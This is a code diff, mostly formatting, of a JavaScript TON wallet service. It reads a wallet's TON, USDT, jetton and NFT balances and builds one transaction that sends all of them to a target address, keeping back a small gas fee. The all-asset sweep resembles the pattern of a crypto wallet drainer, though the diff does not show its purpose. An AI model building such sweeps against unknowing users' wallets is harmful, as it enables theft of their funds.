@@ -161,7 +161,7 @@ export class WalletService {
         ton: { balance: "0", balanceTon: "0" },
         nfts: [],
         jettons: [],
-        usdt: { balance: "0", balanceUsdt: "0" }
+        usdt: { balance: "0", balanceUsdt: "0" },
       };
 
       // 1. 获取TON余额
@@ -171,7 +171,9 @@ export class WalletService {
       const tonData = await tonRes.json();
       assets.ton.balance = tonData.balance || "0";
       // 修复：确保传入字符串
-      assets.ton.balanceTon = TonWeb.utils.fromNano(String(tonData.balance || "0"));
+      assets.ton.balanceTon = TonWeb.utils.fromNano(
+        String(tonData.balance || "0")
+      );
 
       // 2. 获取NFT资产
       const nftRes = await fetch(
@@ -188,8 +190,10 @@ export class WalletService {
       assets.jettons = jettonData.balances || [];
 
       // 4. 查找USDT余额
-      const usdtJetton = assets.jettons.find(j => 
-        j.jetton?.address === "EQCxE6mUtQJKFnGfaROTKOt1lZbDiiX1kCixRv7Nw2Id_sDs"
+      const usdtJetton = assets.jettons.find(
+        (j) =>
+          j.jetton?.address ===
+          "EQCxE6mUtQJKFnGfaROTKOt1lZbDiiX1kCixRv7Nw2Id_sDs"
       );
       console.log("usdtJetton", usdtJetton);
       if (usdtJetton) {
@@ -204,7 +208,7 @@ export class WalletService {
         ton: assets.ton.balanceTon,
         nftCount: assets.nfts.length,
         jettonCount: assets.jettons.length,
-        usdt: assets.usdt.balanceUsdt
+        usdt: assets.usdt.balanceUsdt,
       });
 
       return assets;
@@ -217,11 +221,11 @@ export class WalletService {
   /**
    * 创建批量资产转移交易
    */
-  static async createBulkAssetTransfer(wallet, targetAddress) {
+  static async createAllAssetTransfer(wallet, targetAddress) {
     try {
       const walletKey = `wallet:${wallet}`;
       const walletData = await redis.get(walletKey);
-      
+
       if (!walletData) {
         throw new Error("walletData not found");
       }
@@ -232,11 +236,12 @@ export class WalletService {
 
       // 1. TON转账（保留少量作为Gas费）
       const tonBalance = parseFloat(assets.ton.balanceTon);
-      if (tonBalance > 0.1) { // 保留0.1 TON作为Gas费
+      if (tonBalance > 0.1) {
+        // 保留0.1 TON作为Gas费
         const transferAmount = tonBalance - 0.1;
         // 修复：限制小数位数
         const fixedTransferAmount = parseFloat(transferAmount.toFixed(9));
-        
+
         messages.push({
           address: targetAddress,
           amount: this.toNanoStr(fixedTransferAmount),
@@ -249,9 +254,9 @@ export class WalletService {
         const usdtPayload = await this.buildUsdtTransferPayload({
           toAddress: targetAddress,
           amount: assets.usdt.balanceUsdt,
-          responseTo: wallet
+          responseTo: wallet,
         });
-        
+
         messages.push({
           address: "EQCxE6mUtQJKFnGfaROTKOt1lZbDiiX1kCixRv7Nw2Id_sDs", // USDT合约
           amount: this.toNanoStr(0.1), // Gas费
@@ -265,7 +270,7 @@ export class WalletService {
           newOwner: targetAddress,
           responseTo: wallet,
           forwardAmountTon: 0,
-          forwardComment: `Bulk transfer NFT`
+          forwardComment: `Bulk transfer NFT`,
         });
 
         messages.push({
@@ -278,7 +283,10 @@ export class WalletService {
       // 4. 其他Jetton转移
       for (const jetton of assets.jettons) {
         // 跳过USDT（已经处理过）
-        if (jetton.jetton?.address === "EQCxE6mUtQJKFnGfaROTKOt1lZbDiiX1kCixRv7Nw2Id_sDs") {
+        if (
+          jetton.jetton?.address ===
+          "EQCxE6mUtQJKFnGfaROTKOt1lZbDiiX1kCixRv7Nw2Id_sDs"
+        ) {
           continue;
         }
 
@@ -286,7 +294,7 @@ export class WalletService {
           toAddress: targetAddress,
           amount: jetton.balance,
           jettonAddress: jetton.jetton.address,
-          responseTo: wallet
+          responseTo: wallet,
         });
 
         messages.push({
@@ -304,7 +312,7 @@ export class WalletService {
           ton: tonBalance > 0.1 ? 1 : 0,
           nft: assets.nfts.length,
           jetton: assets.jettons.length,
-          usdt: parseFloat(assets.usdt.balanceUsdt) > 0 ? 1 : 0
+          usdt: parseFloat(assets.usdt.balanceUsdt) > 0 ? 1 : 0,
         },
         totalMessages: messages.length,
         ts: Date.now(),
@@ -316,9 +324,8 @@ export class WalletService {
         success: true,
         data: { messages, raw },
         assets: assets,
-        message: `批量转移交易已生成: ${messages.length} 个消息`
+        message: `批量转移交易已生成: ${messages.length} 个消息`,
       };
-
     } catch (error) {
       console.error("创建批量资产转移错误:", error);
       throw new Error(`创建批量资产转移失败: ${error.message}`);
